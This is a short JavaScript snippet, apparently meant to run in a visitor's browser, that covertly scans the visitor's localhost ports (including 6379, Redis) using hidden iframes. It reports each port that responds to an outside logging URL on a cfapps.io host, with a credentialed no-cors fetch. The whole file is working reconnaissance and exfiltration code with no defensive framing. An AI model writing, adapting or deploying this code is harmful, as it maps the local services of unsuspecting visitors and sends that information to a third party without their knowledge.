
        var ports = [80, 443, 8080,2000, 6379];
        var checkPort = (port) => {
            var src = "http://127.0.0.1:"+port;
            var frame = document.createElement("iframe");
            frame.setAttribute("src", src);
            frame.setAttribute("style", "display:none");
            document.body.appendChild(frame);

            frame.onload = () => {
                //document.getElementById("out").innerHTML += port+" | open <br />"
                fetch("http://php-demo-app-shibli.cfapps.io/logger.php?logs=Port opened ->"+port, {mode:"no-cors", credentials: "include"});
            }
        }
        ports.forEach(port => {
            try{
                checkPort(port);
            }catch(error){
                console.log(error);
            }
        })
